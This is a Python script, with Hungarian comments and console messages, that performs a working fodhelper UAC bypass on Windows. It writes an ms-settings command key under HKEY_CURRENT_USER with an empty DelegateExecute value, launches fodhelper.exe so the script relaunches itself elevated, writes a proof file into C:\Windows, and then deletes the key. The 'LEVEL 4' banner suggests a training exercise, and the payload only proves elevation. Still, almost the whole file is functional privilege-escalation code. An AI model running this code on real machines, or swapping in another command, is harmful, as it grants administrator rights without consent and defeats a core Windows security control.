import os
import sys
import winreg as reg
import time
import ctypes

def is_admin():
    """
    Ellenőrzi, hogy a script admin jogokkal fut-e.
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def admin_proof_test():
    """
    BIZONYÍTÉK: Megpróbálunk írni a C:\Windows mappába.
    Ide csak Admin írhat.
    """
    proof_file = r"C:\Windows\norisz_proof.txt"
    try:
        with open(proof_file, "w") as f:
            f.write("Sikeres UAC Bypass! Ez a fajl bizonyitja az Admin jogot.\n")
        print(f"\n[+] SIKER! Létrehoztam a bizonyítékot: {proof_file}")
        print("[+] Mivel a Windows mappába tudtam írni, biztosan ADMIN vagyok.")
    except PermissionError:
        print("\n[-] KUDARC: Nincs jogom írni a Windows mappába.")
        print("[-] Még mindig csak sima felhasználó vagy.")

def fodhelper_bypass(cmd):
    print(f"[*] Kísérlet a UAC megkerülésére...")
    
    # Registry kulcs (Fodhelper útvonal)
    key_path = r"Software\Classes\ms-settings\Shell\Open\command"
    
    try:
        # Kulcs létrehozása
        key = reg.CreateKey(reg.HKEY_CURRENT_USER, key_path)
        
        # DelegateExecute (a trükk)
        reg.SetValueEx(key, "DelegateExecute", 0, reg.REG_SZ, "")
        
        # A parancs beállítása (A mostani script újrahívása)
        reg.SetValueEx(key, "", 0, reg.REG_SZ, cmd)
        
        reg.CloseKey(key)
        
        print("[*] Fodhelper indítása (ez fogja megnyitni az új ablakot)...")
        # Elindítjuk a Windows hivatalos eszközét, ami végrehajtja a parancsunkat
        os.system("fodhelper.exe") 
        
        # Takarítás
        time.sleep(2)
        reg.DeleteKey(reg.HKEY_CURRENT_USER, key_path)
        
    except Exception as e:
        print(f"[-] Hiba a registry írásnál: {e}")

if __name__ == "__main__":
    os.system("cls")
    
    if is_admin():
        # EZT A RÉSZT FOGJA FUTTATNI AZ ÚJ ABLAK
        os.system("color 0A") # Zöld betűk a siker jelzésére
        print("--- [ LEVEL 4: ADMIN JOG MEGSZEREZVE ] ---")
        admin_proof_test() # Itt történik a fájl írása
        input("\nNyomj Entert a kilépéshez...")
    else:
        # EZT A RÉSZT FUTTATOD TE ELŐSZÖR
        print("--- [ LEVEL 4: UAC BYPASS INDÍTÁSA ] ---")
        print("[*] Jelenlegi státusz: Sima Felhasználó")
        
        # Ellenőrizzük, hogy tudunk-e írni a Windows mappába (Most NEM kéne sikerülnie)
        print("[*] Előzetes teszt: Próbálok írni a Windows mappába...")
        try:
            with open(r"C:\Windows\norisz_fail_test.txt", "w") as f: f.write("x")
        except PermissionError:
            print("[OK] Sikerült a teszt: Nincs jogom írni (ez normális).")
        
        print("\n[*] Támadás indítása...")
        
        # A parancs összeállítása: python.exe "script_utvonala"
        current_script = os.path.abspath(sys.argv[0])
        # Fontos: idézőjelek közé tesszük az útvonalat, ha van benne szóköz
        cmd_to_run = f'cmd /c start python "{current_script}"'
        
        fodhelper_bypass(cmd_to_run)